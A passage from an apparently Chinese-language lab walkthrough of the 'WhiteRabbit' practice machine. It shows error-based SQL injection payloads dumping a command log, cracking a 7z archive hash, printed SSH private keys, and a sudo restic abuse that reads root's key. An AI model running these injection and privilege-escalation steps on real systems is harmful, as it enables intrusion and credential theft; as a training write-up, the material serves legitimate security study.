rest:http://75951e6ff.whi...</span><br><span class="line">1c594abdcd8596b1bb58fbdddae88b8837f7cbc9c9806f15f889378379f7b7fa</span><br><span class="line">&#123;&quot;campaign_id&quot;:1,&quot;email&quot;:&quot;test@ex.com\&quot; OR ExtractValue(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(id, 0x3a, command, 0x3a, date) FROM temp.command_log), 100, 50))) -- -&quot;,&quot;messa</span><br><span class="line">ge&quot;:&quot;Clicked Link&quot;&#125;</span><br><span class="line">~0 11:58:05,3:echo ygcsvCuMdf...</span><br><span class="line">c1f736db32959507f9b91199f762a983eee104bc59e28d2e6125924601a5b711</span><br><span class="line">&#123;&quot;campaign_id&quot;:1,&quot;email&quot;:&quot;test@ex.com\&quot; OR ExtractValue(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(id, 0x3a, command, 0x3a, date) FROM temp.command_log), 150, 50))) -- -&quot;,&quot;messa</span><br><span class="line">ge&quot;:&quot;Clicked Link&quot;&#125;</span><br><span class="line">~ &gt; .restic_passwd:2024-08-30...</span><br><span class="line">b6c3766c58717cd701acac8347893205dac25601fd2514f0ed43e6419307bdb0</span><br><span class="line">&#123;&quot;campaign_id&quot;:1,&quot;email&quot;:&quot;test@ex.com\&quot; OR ExtractValue(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(id, 0x3a, command, 0x3a, date) FROM temp.command_log), 200, 50))) -- -&quot;,&quot;messa</span><br><span class="line">ge&quot;:&quot;Clicked Link&quot;&#125;</span><br><span class="line">~sh_history :2024-08-30 11:59...</span><br><span class="line">ac04df389652440eb392e20b98a2015345d83a50f0aac2938fd429eb7ac1c302</span><br><span class="line">&#123;&quot;campaign_id&quot;:1,&quot;email&quot;:&quot;test@ex.com\&quot; OR ExtractValue(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(id, 0x3a, command, 0x3a, date) FROM temp.command_log), 250, 50))) -- -&quot;,&quot;messa</span><br><span class="line">ge&quot;:&quot;Clicked Link&quot;&#125;</span><br><span class="line">~24-08-30 11:59:47,6:cd /home...</span><br><span class="line">369c7b83603ae04545904ef8d1c0c2d8a97b2f7bbda18fa8683bf5e89085094e</span><br><span class="line">&#123;&quot;campaign_id&quot;:1,&quot;email&quot;:&quot;test@ex.com\&quot; OR ExtractValue(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(id, 0x3a, command, 0x3a, date) FROM temp.command_log), 300, 50))) -- -&quot;,&quot;messa</span><br><span class="line">ge&quot;:&quot;Clicked Link&quot;&#125;</span><br><span class="line">~word-generator/neo-password-...</span><br><span class="line">4e9987aeba8fd5b3dbcdc189a4033aa83fd4f79b3b05cabef912e16aec919c63</span><br><span class="line">&#123;&quot;campaign_id&quot;:1,&quot;email&quot;:&quot;test@ex.com\&quot; OR ExtractValue(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(id, 0x3a, command, 0x3a, date) FROM temp.command_log), 350, 50))) -- -&quot;,&quot;messa</span><br><span class="line">ge&quot;:&quot;Clicked Link&quot;&#125;</span><br><span class="line">~4-08-30 14:40:42</span><br><span class="line">1585a22b074096d6ac2de798538ef5a5e4ae6e54a35cd1f9a3dae05560a5778e</span><br><span class="line">&#123;&quot;campaign_id&quot;:1,&quot;email&quot;:&quot;test@ex.com\&quot; OR ExtractValue(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(id, 0x3a, command, 0x3a, date) FROM temp.command_log), 400, 50))) -- -&quot;,&quot;messa</span><br><span class="line">ge&quot;:&quot;Clicked Link&quot;&#125;</span><br><span class="line">~</span><br><span class="line">baeb4e314dc04190e5ae59cfad4f61db90f32d657cbfcae5fe0d4cae07346af2</span><br><span class="line">&#123;&quot;campaign_id&quot;:1,&quot;email&quot;:&quot;test@ex.com\&quot; OR ExtractValue(1, CONCAT(0x7e, SUBSTRING((SELECT GROUP_CONCAT(id, 0x3a, command, 0x3a, date) FROM temp.command_log), 450, 50))) -- -&quot;,&quot;messa</span><br><span class="line">ge&quot;:&quot;Clicked Link&quot;&#125;</span><br><span class="line">~</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>对dump出来的数据整理一下<br>这里数据不全的话可以调整一下平均的大小</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">~</span><br><span class="line">~:44:01,2:restic init --repo ...</span><br><span class="line">~po rest:http://75951e6ff.whi...</span><br><span class="line">~whiterabbit.htb:2024-08-30 1...</span><br><span class="line">~0 11:58:05,3:echo ygcsvCuMdf...</span><br><span class="line">~MdfZ89yaRLlTKhe5jAmth7vxw &gt; ...</span><br><span class="line">~ &gt; .restic_passwd:2024-08-30...</span><br><span class="line">~-30 11:58:36,4:rm -rf .bash_...</span><br><span class="line">~sh_history :2024-08-30 11:59...</span><br><span class="line">~:59:02,5:#thatwasclose:2024-...</span><br><span class="line">~24-08-30 11:59:47,6:cd /home...</span><br><span class="line">~ome/neo/ &amp;&amp; /opt/neo-passwor...</span><br><span class="line">~word-generator/neo-password-...</span><br><span class="line">~rd-generator | passwd:2024-0...</span><br><span class="line">~4-08-30 14:40:42</span><br><span class="line"></span><br><span class="line">restic init --repo rest:http://75951e6ff.whiterabbit.htb</span><br><span class="line">echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw &gt; .restic_passwd</span><br><span class="line">rm -rf .bash_history</span><br><span class="line">#thatwasclose:</span><br><span class="line">cd /home/neo/ &amp;&amp; /opt/neo-password-generator/neo-password-generator | passwd</span><br></pre></td></tr></table></figure>
<p>如果再把时间整理一下<br>可以得到下面的结果</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Database: temp</span><br><span class="line">Table: command_log</span><br><span class="line">[6 entries]</span><br><span class="line">+----+---------------------+------------------------------------------------------------------------------+</span><br><span class="line">| id | date                | command                                                                      |</span><br><span class="line">+----+---------------------+------------------------------------------------------------------------------+</span><br><span class="line">| 1  | 2024-08-30 10:44:01 | uname -a                                                                     |</span><br><span class="line">| 2  | 2024-08-30 11:58:05 | restic init --repo rest:http://75951e6ff.whiterabbit.htb                     |</span><br><span class="line">| 3  | 2024-08-30 11:58:36 | echo ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw &gt; .restic_passwd                       |</span><br><span class="line">| 4  | 2024-08-30 11:59:02 | rm -rf .bash_history                                                         |</span><br><span class="line">| 5  | 2024-08-30 11:59:47 | #thatwasclose                                                                |</span><br><span class="line">| 6  | 2024-08-30 14:40:42 | cd /home/neo/ &amp;&amp; /opt/neo-password-generator/neo-password-generator | passwd |</span><br><span class="line">+----+---------------------+------------------------------------------------------------------------------+</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>数据库又出一个子域，加一下<br>解密一下这个passwd——<code>ygcsvCuMdfZ89yaRLlTKhe5jAmth7vxw</code><br>无果，看来这个密码不是这么用的<br><img src="/images/whiterabbit-13.png"></p>
<h3 id="restic-get-7z-and-crack"><a href="#restic-get-7z-and-crack" class="headerlink" title="restic get 7z and crack"></a>restic get 7z and crack</h3><p>哈，没啥用诶，google一下这个<a target="_blank" rel="noopener" href="https://github.com/restic/restic">restic</a>是干啥的</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">restic is a backup program that is fast, efficient and secure. It supports the three major operating systems (Linux, macOS, Windows) and a few smaller ones (FreeBSD, OpenBSD).</span><br><span class="line"></span><br><span class="line">For detailed usage and installation instructions check out the documentation.</span><br><span class="line"></span><br><span class="line">You can ask questions in our Discourse forum.</span><br><span class="line"></span><br><span class="line">Restic 是一个快速、高效且安全的备份程序。它支持三种主要的作系统（Linux、macOS、Windows）和一些较小的作系统（FreeBSD、OpenBSD）。</span><br></pre></td></tr></table></figure>
<p>看操作可能和git相似<br>看一下怎么交互</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ restic init --repo rest:http://75951e6ff.whiterabbit.htb</span><br><span class="line">enter password for new repository: </span><br><span class="line">enter password again: </span><br><span class="line">Fatal: create repository at rest:http://75951e6ff.whiterabbit.htb/ failed: config file already exists</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>直接执行他给的话会提示已经存在，说明这个（就叫他库吧）已经存在了，类似于git，看看有没有其他操作<br>找到<a target="_blank" rel="noopener" href="https://restic.readthedocs.io/en/latest/045_working_with_repos.html#listing-all-snapshots">列出文件的操作</a><br>参考弄一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ restic --repo http://75951e6ff.whiterabbit.htb ls</span><br><span class="line">Fatal: no snapshot ID specified, specify snapshot ID or use special ID &#x27;latest&#x27;</span><br><span class="line"></span><br><span class="line">#缺一个snapshotID</span><br><span class="line">$ restic -r http://75951e6ff.whiterabbit.htb snapshots</span><br><span class="line">Fatal: parsing repository location failed: invalid backend</span><br><span class="line">If the repository is in a local directory, you need to add a `local:` prefix</span><br><span class="line"></span><br><span class="line">$ restic -r rest:http://75951e6ff.whiterabbit.htb snapshots</span><br><span class="line">enter password for repository: </span><br><span class="line">repository 5b26a938 opened (version 2, compression level auto)</span><br><span class="line">created new cache in /home/lusowen/.cache/restic</span><br><span class="line">ID        Time                 Host         Tags        Paths</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">272cacd5  2025-03-07 08:18:40  whiterabbit              /dev/shm/bob/ssh</span><br><span class="line">------------------------------------------------------------------------</span><br><span class="line">1 snapshots</span><br><span class="line"></span><br><span class="line">#枚举一下文件</span><br><span class="line">$ restic -r rest:http://75951e6ff.whiterabbit.htb ls 272cacd5</span><br><span class="line">enter password for repository: </span><br><span class="line">repository 5b26a938 opened (version 2, compression level auto)</span><br><span class="line">[0:02] 100.00%  5 / 5 index files loaded</span><br><span class="line">snapshot 272cacd5 of [/dev/shm/bob/ssh] filtered by [] at 2025-03-06 17:18:40.024074307 -0700 -0700):</span><br><span class="line">/dev</span><br><span class="line">/dev/shm</span><br><span class="line">/dev/shm/bob</span><br><span class="line">/dev/shm/bob/ssh</span><br><span class="line">/dev/shm/bob/ssh/bob.7z</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>有一个.7z文件，下载下来<br><code>接着刚刚的documwnt文档往下翻可以找到</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ restic -r rest:http://75951e6ff.whiterabbit.htb restore 272cacd5 --target download</span><br><span class="line">enter password for repository: </span><br><span class="line">repository 5b26a938 opened (version 2, compression level auto)</span><br><span class="line">[0:00]          0 index files loaded</span><br><span class="line">restoring &lt;Snapshot 272cacd5 of [/dev/shm/bob/ssh] at 2025-03-06 17:18:40.024074307 -0700 -0700 by ctrlzero@whiterabbit&gt; to download</span><br><span class="line">Summary: Restored 5 files/dirs (572 B) in 0:01</span><br><span class="line"></span><br><span class="line">$ tree download </span><br><span class="line">download</span><br><span class="line">└── dev</span><br><span class="line">    └── shm</span><br><span class="line">        └── bob</span><br><span class="line">            └── ssh</span><br><span class="line">                └── bob.7z</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>解压缩一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">$ 7z x bob.7z </span><br><span class="line"></span><br><span class="line">7-Zip 23.01 (x64) : Copyright (c) 1999-2023 Igor Pavlov : 2023-06-20</span><br><span class="line"> 64-bit locale=zh_CN.UTF-8 Threads:24 OPEN_MAX:1024</span><br><span class="line"></span><br><span class="line">Scanning the drive for archives:</span><br><span class="line">1 file, 572 bytes (1 KiB)</span><br><span class="line"></span><br><span class="line">Extracting archive: bob.7z</span><br><span class="line">--</span><br><span class="line">Path = bob.7z</span><br><span class="line">Type = 7z</span><br><span class="line">Physical Size = 572</span><br><span class="line">Headers Size = 204</span><br><span class="line">Method = LZMA2:12 7zAES</span><br><span class="line">Solid = +</span><br><span class="line">Blocks = 1</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">Enter password (will not be echoed):</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>咦，盆友，还要加密</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$ ./7z2john.pl ../../bob.7z </span><br><span class="line">ATTENTION: the hashes might contain sensitive encrypted data. Be careful when sharing or posting these hashes</span><br><span class="line">bob.7z:$7z$2$19$0$$8$61d81f6f9997419d0000000000000000$4049814156$368$365$7295a784b0a8cfa7d2b0a8a6f88b961c8351682f167ab77e7be565972b82576e7b5ddd25db30eb27137078668756bf9dff5ca3a39ca4d9c7f264c19a58981981486a4ebb4a682f87620084c35abb66ac98f46fd691f6b7125ed87d58e3a37497942c3c6d956385483179536566502e598df3f63959cf16ea2d182f43213d73feff67bcb14a64e2ecf61f956e53e46b17d4e4bc06f536d43126eb4efd1f529a2227ada8ea6e15dc5be271d60360ff5c816599f0962fc742174ff377e200250b835898263d997d4ea3ed6c3fc21f64f5e54f263ebb464e809f9acf75950db488230514ee6ed92bd886d0a9303bc535ca844d2d2f45532486256fbdc1f606cca1a4680d75fa058e82d89fd3911756d530f621e801d73333a0f8419bd403350be99740603dedff4c35937b62a1668b5072d6454aad98ff491cb7b163278f8df3dd1e64bed2dac9417ca3edec072fb9ac0662a13d132d7aa93ff58592703ec5a556be2c0f0c5a3861a32f221dcb36ff3cd713$399$00</span><br><span class="line">#痛苦：（</span><br><span class="line">$7z$2$19$0$$8$61d81f6f9997419d0000000000000000$4049814156$368$365$7295a784b0a8cfa7d2b0a8a6f88b961c8351682f167ab77e7be565972b82576e7b5ddd25db30eb27137078668756bf9dff5ca3a39ca4d9c7f264c19a58981981486a4ebb4a682f87620084c35abb66ac98f46fd691f6b7125ed87d58e3a37497942c3c6d956385483179536566502e598df3f63959cf16ea2d182f43213d73feff67bcb14a64e2ecf61f956e53e46b17d4e4bc06f536d43126eb4efd1f529a2227ada8ea6e15dc5be271d60360ff5c816599f0962fc742174ff377e200250b835898263d997d4ea3ed6c3fc21f64f5e54f263ebb464e809f9acf75950db488230514ee6ed92bd886d0a9303bc535ca844d2d2f45532486256fbdc1f606cca1a4680d75fa058e82d89fd3911756d530f621e801d73333a0f8419bd403350be99740603dedff4c35937b62a1668b5072d6454aad98ff491cb7b163278f8df3dd1e64bed2dac9417ca3edec072fb9ac0662a13d132d7aa93ff58592703ec5a556be2c0f0c5a3861a32f221dcb36ff3cd713$399$00:1q2w3e4r5t6y</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ok，get pass<br>解压缩一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ ls</span><br><span class="line">bob  bob.7z  bob.pub  config</span><br><span class="line">$ cat bob </span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW</span><br><span class="line">QyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4wAAAJAQ+wJXEPsC</span><br><span class="line">VwAAAAtzc2gtZWQyNTUxOQAAACBvDTUyRwF4Q+A2imxODnY8hBTEGnvNB0S2vaLhmHZC4w</span><br><span class="line">AAAEBqLjKHrTqpjh/AqiRB07yEqcbH/uZA5qh8c0P72+kSNW8NNTJHAXhD4DaKbE4OdjyE</span><br><span class="line">FMQae80HRLa9ouGYdkLjAAAACXJvb3RAbHVjeQECAwQ=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这私钥有了<br>登录一下（nmap上它给了两个ssh的端口，都试一下）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">$ ssh -i bob bob@10.10.11.63</span><br><span class="line">The authenticity of host &#x27;10.10.11.63 (10.10.11.63)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:F9XNz/rgt655Q1XKkL6at11Zy5IXAogAEH95INEOrIE.</span><br><span class="line">This host key is known by the following other names/addresses:</span><br><span class="line">    ~/.ssh/known_hosts:4: [hashed name]</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;10.10.11.63&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">bob@10.10.11.63&#x27;s password: </span><br><span class="line"></span><br><span class="line">#22要密码，我哪来的密码</span><br><span class="line"></span><br><span class="line">$ ssh -i bob bob@10.10.11.63 -p 2222</span><br><span class="line">The authenticity of host &#x27;[10.10.11.63]:2222 ([10.10.11.63]:2222)&#x27; can&#x27;t be established.</span><br><span class="line">ED25519 key fingerprint is SHA256:jWKKPrkxU01KGLZeBG3gDZBIqKBFlfctuRcPBBG39sA.</span><br><span class="line">This key is not known by any other names.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span><br><span class="line">Warning: Permanently added &#x27;[10.10.11.63]:2222&#x27; (ED25519) to the list of known hosts.</span><br><span class="line">Welcome to Ubuntu 24.04 LTS (GNU/Linux 6.8.0-57-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line">This system has been minimized by removing packages and content that are</span><br><span class="line">not required on a system that users do not log into.</span><br><span class="line"></span><br><span class="line">To restore this content, you can run the &#x27;unminimize&#x27; command.</span><br><span class="line">Last login: Thu Apr 10 06:05:44 2025 from 10.10.14.106</span><br><span class="line">bob@ebdce80611e9:~$ </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="shell-as-bob"><a href="#shell-as-bob" class="headerlink" title="shell as bob"></a>shell as bob</h2><p>sudo -l 零帧起手</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">bob@ebdce80611e9:~$ ls                                                                    </span><br><span class="line">bob@ebdce80611e9:~$ pwd                                                                   </span><br><span class="line">/home/bob                            </span><br><span class="line">bob@ebdce80611e9:~$ sudo -l                                                               </span><br><span class="line">Matching Defaults entries for bob on ebdce80611e9:         </span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty</span><br><span class="line">                                                                                          </span><br><span class="line">User bob may run the following commands on ebdce80611e9:</span><br><span class="line">    (ALL) NOPASSWD: /usr/bin/restic </span><br></pre></td></tr></table></figure>
<p>还是restic，还记得他是一个备份系统，那不久可以先构建然后再解压缩<br>尝试一下<br>直接参考上面没关掉的<a target="_blank" rel="noopener" href="https://restic.readthedocs.io/en/latest/030_preparing_a_new_repo.html">文档</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">bob@ebdce80611e9:~$ sudo /usr/bin/restic init --repo wansh</span><br><span class="line">enter password for new repository: </span><br><span class="line">enter password again: </span><br><span class="line">created restic repository 3f753556c8 at wansh</span><br><span class="line"></span><br><span class="line">Please note that knowledge of your password is required to access</span><br><span class="line">the repository. Losing your password means that your data is</span><br><span class="line">irrecoverably lost.</span><br><span class="line"></span><br><span class="line">#new repo下面就是backup</span><br><span class="line">bob@ebdce80611e9:~$ sudo /usr/bin/restic -r wansh --verbose backup /root</span><br><span class="line">open repository</span><br><span class="line">enter password for repository: </span><br><span class="line">repository 3f753556 opened (version 2, compression level auto)</span><br><span class="line">lock repository</span><br><span class="line">no parent snapshot found, will read all files</span><br><span class="line">load index files</span><br><span class="line"></span><br><span class="line">start scan on [/root]</span><br><span class="line">start backup on [/root]</span><br><span class="line">scan finished in 0.207s: 4 files, 3.865 KiB</span><br><span class="line"></span><br><span class="line">Files:           4 new,     0 changed,     0 unmodified</span><br><span class="line">Dirs:            3 new,     0 changed,     0 unmodified</span><br><span class="line">Data Blobs:      4 new</span><br><span class="line">Tree Blobs:      3 new</span><br><span class="line">Added to the repository: 6.493 KiB (3.601 KiB stored)</span><br><span class="line"></span><br><span class="line">processed 4 files, 3.865 KiB in 0:00</span><br><span class="line">snapshot 27efb719 saved</span><br><span class="line"></span><br><span class="line">bob@ebdce80611e9:~$ sudo /usr/bin/restic -r wansh ls 27efb719</span><br><span class="line">enter password for repository: </span><br><span class="line">repository 3f753556 opened (version 2, compression level auto)</span><br><span class="line">[0:00] 100.00%  1 / 1 index files loaded</span><br><span class="line">snapshot 27efb719 of [/root] filtered by [] at 2025-04-10 08:02:28.139240699 +0000 UTC):</span><br><span class="line">/root</span><br><span class="line">/root/.bash_history</span><br><span class="line">/root/.bashrc</span><br><span class="line">/root/.cache</span><br><span class="line">/root/.profile</span><br><span class="line">/root/.ssh</span><br><span class="line">/root/morpheus</span><br><span class="line">/root/morpheus.pub</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>用户名有了，私钥也有了，套路了吧</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">bob@ebdce80611e9:~$ sudo /usr/bin/restic -r wansh restore 27efb719 --target wansh</span><br><span class="line">enter password for repository: </span><br><span class="line">repository 3f753556 opened (version 2, compression level auto)</span><br><span class="line"></span><br><span class="line">restoring &lt;Snapshot 27efb719 of [/root] at 2025-04-10 08:02:28.139240699 +0000 UTC by root@ebdce80611e9&gt; to wansh</span><br><span class="line">Summary: Restored 8 files/dirs (3.865 KiB) in 0:00</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>然后就会恍然，这个保存下来的属主是root，小小bob没有读写权限<br>再翻一下文档<br>restic里面有一个<a target="_blank" rel="noopener" href="https://restic.readthedocs.io/en/latest/050_restore.html#printing-files-to-stdout">dump的功能</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">bob@ebdce80611e9:~$ sudo /usr/bin/restic -r wansh dump 27efb719 /root/morpheus</span><br><span class="line">enter password for repository: </span><br><span class="line">repository 3f753556 opened (version 2, compression level auto)</span><br><span class="line">[0:00] 100.00%  1 / 1 index files loaded</span><br><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAaAAAABNlY2RzYS</span><br><span class="line">1zaGEyLW5pc3RwMjU2AAAACG5pc3RwMjU2AAAAQQS/TfMMhsru2K1PsCWvpv3v3Ulz5cBP</span><br><span class="line">UtRd9VW3U6sl0GWb0c9HR5rBMomfZgDSOtnpgv5sdTxGyidz8TqOxb0eAAAAqOeHErTnhx</span><br><span class="line">K0AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBL9N8wyGyu7YrU+w</span><br><span class="line">Ja+m/e/dSXPlwE9S1F31VbdTqyXQZZvRz0dHmsEyiZ9mANI62emC/mx1PEbKJ3PxOo7FvR</span><br><span class="line">4AAAAhAIUBairunTn6HZU/tHq+7dUjb5nqBF6dz5OOrLnwDaTfAAAADWZseEBibGFja2xp</span><br><span class="line">c3QBAg==</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>ok，保存一下</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$ ssh morpheus@10.10.11.63 -i morpheus </span><br><span class="line">Welcome to Ubuntu 24.04.2 LTS (GNU/Linux 6.8.0-57-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com</span><br><span class="line"> * Management:     https://landscape.canonical.com</span><br><span class="line"> * Support:        https://ubuntu.com/pro</span><br><span class="line"></span><br><span class="line">This system has been minimized by removing packages and content that are</span><br><span class="line">not required on a system that users do not log into.</span><br><span class="line"></span><br><span class="line">To restore this content, you can run the &#x27;unminimize&#x27; command.</span><br><span class="line">Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy 